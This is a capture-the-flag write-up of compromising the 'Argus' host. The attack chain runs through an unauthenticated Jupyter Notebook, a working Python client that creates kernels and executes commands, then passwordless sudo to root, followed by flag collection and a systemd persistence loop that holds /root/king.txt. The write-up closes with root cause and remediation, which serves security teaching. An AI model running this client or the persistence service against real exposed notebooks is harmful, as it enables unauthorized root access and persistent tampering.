# Argus — Detailed Write-up

- **Target:** `159.223.68.133`
- **Hostname:** `Argus`
- **Objective:** collect the Legion flags, gain root access, and control `/root/king.txt`.

## 1. Enumeration

The target was scanned with Nmap:

```bash
nmap -Pn -sC -sV -p- --min-rate 1000 159.223.68.133
nmap -Pn -sV --top-ports 1000 --min-rate 2000 159.223.68.133
```

Three TCP services were exposed:

| Port | Service | Details |
|---:|---|---|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 25 | SMTP | SMTP service with limited banner information |
| 8888 | HTTP | Tornado 6.5.8 |

Requesting the web root produced a redirect:

```bash
curl -i http://159.223.68.133:8888/
```

```http
HTTP/1.1 302 Found
Server: TornadoServer/6.5.8
Location: /tree?
```

## 2. Unauthenticated Jupyter Notebook

Following `/tree` identified Jupyter Notebook 7.6.2:

```bash
curl -L http://159.223.68.133:8888/tree
```

The page exposed several important configuration values:

```json
{
  "appName": "Jupyter Notebook",
  "appVersion": "7.6.2",
  "rootUri": "file:///home/jupyter_svc/notebooks",
  "terminalsAvailable": true,
  "token": ""
}
```

The empty token meant that the notebook was accessible without authentication. Its API endpoints were also publicly accessible:

```bash
curl http://159.223.68.133:8888/api/status
curl http://159.223.68.133:8888/api/kernelspecs
```

The server offered a Python kernel through `ipykernel_launcher`, allowing operating-system commands to be executed through Python.

## 3. Initial Access Through the Kernel API

The exploitation sequence was:

1. Request `/tree` to receive the Jupyter cookies and `_xsrf` token.
2. Send `POST /api/kernels` with the XSRF token.
3. Connect to the new kernel's WebSocket channels endpoint.
4. Send an `execute_request` containing Python code.
5. Use `subprocess` to execute shell commands.

The relevant endpoints were:

```text
POST /api/kernels
WS   /api/kernels/<kernel-id>/channels
```

An abbreviated client looks like this:

```python
import json
import requests
import websocket

base = "http://159.223.68.133:8888"
session = requests.Session()
session.get(base + "/tree")

xsrf = session.cookies.get("_xsrf")
response = session.post(
    base + "/api/kernels",
    headers={"X-XSRFToken": xsrf},
    json={},
)

kernel_id = response.json()["id"]
cookie = "; ".join(
    f"{name}={value}" for name, value in session.cookies.items()
)

ws = websocket.create_connection(
    f"ws://159.223.68.133:8888/api/kernels/{kernel_id}/channels",
    cookie=cookie,
    origin=base,
)
```

Commands could then be run from a kernel cell:

```python
import subprocess

print(subprocess.run(
    "id; hostname; whoami; sudo -n -l",
    shell=True,
    text=True,
    capture_output=True,
).stdout)
```

## 4. Privilege Escalation

The kernel ran as `jupyter_svc`:

```text
uid=1002(jupyter_svc) gid=1002(jupyter_svc)
groups=1002(jupyter_svc),1004(argus)
```

Checking sudo permissions exposed a critical configuration error:

```bash
sudo -n -l
```

```text
User jupyter_svc may run the following commands on Argus:
    (ALL) NOPASSWD: ALL
```

No local exploit was necessary. The service account could run arbitrary commands as root:

```bash
sudo id
sudo cat /root/fl4g.txt
sudo cat /root/king.txt
```

The complete path was:

```text
Unauthenticated Jupyter on port 8888
                  |
                  v
Anonymous Python kernel creation
                  |
                  v
Command execution as jupyter_svc
                  |
                  v
Passwordless sudo ALL
                  |
                  v
Root access
```

## 5. Flag Collection

The flag filename used leetspeak—`fl4g.txt`—so a search only for `*flag*` would miss it. A suitable search was:

```bash
sudo find /home /root /opt /var \
  -type f \
  \( -iname '*fl*g*' -o -iname '*proof*' \
     -o -iname 'user.txt' -o -iname 'root.txt' \) \
  -size -16k 2>/dev/null
```

### devops

Path:

```text
/home/devops/fl4g.txt
```

Flag:

```text
Legion{a2b3c4d5e6f70819a2b3c4d5e6f70819}
```

### cacheop

Path:

```text
/home/cacheop/fl4g.txt
```

Flag:

```text
Legion{b3c4d5e6f708192ab3c4d5e6f708192a}
```

### jupyter_svc

Path:

```text
/home/jupyter_svc/fl4g.txt
```

Flag:

```text
Legion{c4d5e6f708192b3cc4d5e6f708192b3c}
```

### root

Path:

```text
/root/fl4g.txt
```

Flag:

```text
Legion{d5e6f708192b3c4dd5e6f708192b3c4d}
```

No additional flag was present in `/home/argus_admin` during enumeration.

## 6. Finding `king.txt`

The king file was located with:

```bash
sudo find / -type f -name king.txt 2>/dev/null
```

Result:

```text
/root/king.txt
```

Useful inspection commands included:

```bash
sudo ls -la /root/king.txt
sudo lsattr /root/king.txt
sudo stat /root/king.txt
sudo cat /root/king.txt
```

During the engagement, competing values included:

```text
3xp10it
ZAARA
```

## 7. Competing King Holders

The first competing holder used root's crontab:

```cron
* * * * * echo 3xp10it > /root/king.txt
* * * * * chattr -i /root/king.txt; echo 3xp10it > /root/king.txt
```

It was found using:

```bash
sudo crontab -l
```

Another player later installed:

```text
/etc/systemd/system/zaara-king.service
/usr/local/sbin/zaara-king.sh
```

The associated process repeatedly removed restrictive attributes and wrote its value:

```bash
chattr -i -a /root/king.txt
printf 'ZAARA\n' > /root/king.txt
```

Useful commands for identifying competing holders were:

```bash
sudo ps -eo pid,ppid,user,lstart,args --sort=start_time |
  grep -Ei 'king|chattr|while true'

sudo systemctl list-units --type=service --all |
  grep -Ei 'king|hold'

sudo grep -RniE 'king.txt|ZAARA' \
  /etc/systemd/system \
  /etc/cron* \
  /usr/local/sbin \
  /tmp 2>/dev/null
```

## 8. Legion King Holder

A systemd-managed holder was created with the value `legion`.

Holder script:

```bash
#!/bin/bash

while true; do
    chattr -i -a /root/king.txt 2>/dev/null || true
    printf 'legion\n' > /root/king.txt
    chmod 644 /root/king.txt
    sleep 0.1
done
```

Location:

```text
/usr/local/sbin/legion-kinghold.sh
```

Service definition:

```ini
[Unit]
Description=Legion king hold
After=multi-user.target

[Service]
Type=simple
ExecStart=/usr/local/sbin/legion-kinghold.sh
Restart=always
RestartSec=0

[Install]
WantedBy=multi-user.target
```

Location:

```text
/etc/systemd/system/legion-kinghold.service
```

Activation commands:

```bash
sudo chmod 700 /usr/local/sbin/legion-kinghold.sh
sudo systemctl daemon-reload
sudo systemctl enable --now legion-kinghold.service
```

Verification:

```bash
sudo cat /root/king.txt
sudo systemctl is-active legion-kinghold.service
```

Because every successful competitor also obtains unrestricted root access, no local king holder is permanent while the original Jupyter-to-root route remains open.

## 9. Root Cause

Argus was compromised through two severe configuration errors:

1. Jupyter Notebook was exposed publicly without a token or password.
2. The Jupyter service account had unrestricted passwordless sudo:

```sudoers
jupyter_svc ALL=(ALL) NOPASSWD: ALL
```

SSH and SMTP were not required for the successful attack.

## 10. Remediation

- Remove public access to port `8888`.
- Require a strong Jupyter token or password.
- Bind Jupyter to localhost or an internal management interface.
- Disable anonymous terminal and kernel creation.
- Remove `NOPASSWD: ALL` from `jupyter_svc`.
- Grant only narrowly scoped sudo permissions when operationally necessary.
- Remove unauthorized services, cron entries, and scripts.
- Rotate credentials and SSH keys following compromise.
- Review Jupyter kernel history, shell history, systemd units, and cron jobs.
- Rebuild a real-world host after this degree of multi-user root compromise.

## Summary

Argus had a short compromise path: an unauthenticated Jupyter Notebook allowed arbitrary Python kernel execution, and its `jupyter_svc` account had unrestricted passwordless sudo. This immediately provided root access, all four Legion flags, and access to `/root/king.txt`.
